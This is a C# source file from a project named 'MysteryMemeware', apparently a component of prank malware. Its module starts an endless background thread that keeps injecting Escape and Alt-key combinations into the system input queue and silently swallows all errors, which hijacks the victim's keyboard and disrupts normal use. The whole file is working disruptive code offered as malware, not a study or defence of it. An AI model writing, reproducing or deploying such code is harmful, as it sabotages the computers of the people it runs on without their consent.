namespace MysteryMemeware
{
    public static class InputSpamModule
    {
        public static void Run()
        {
            try
            {
                System.Threading.Thread cursorControlThread = new System.Threading.Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            Win32InputHelper.PressKey(27);
                        }
                        catch
                        {

                        }
                        try
                        {
                            Win32InputHelper.KeyDown(18);
                            Win32InputHelper.KeyDown(155);
                            Win32InputHelper.KeyUp(155);
                            Win32InputHelper.KeyUp(18);
                        }
                        catch
                        {

                        }
                    }
                });
                cursorControlThread.Start();
            }
            catch
            {

            }
        }
    }
}
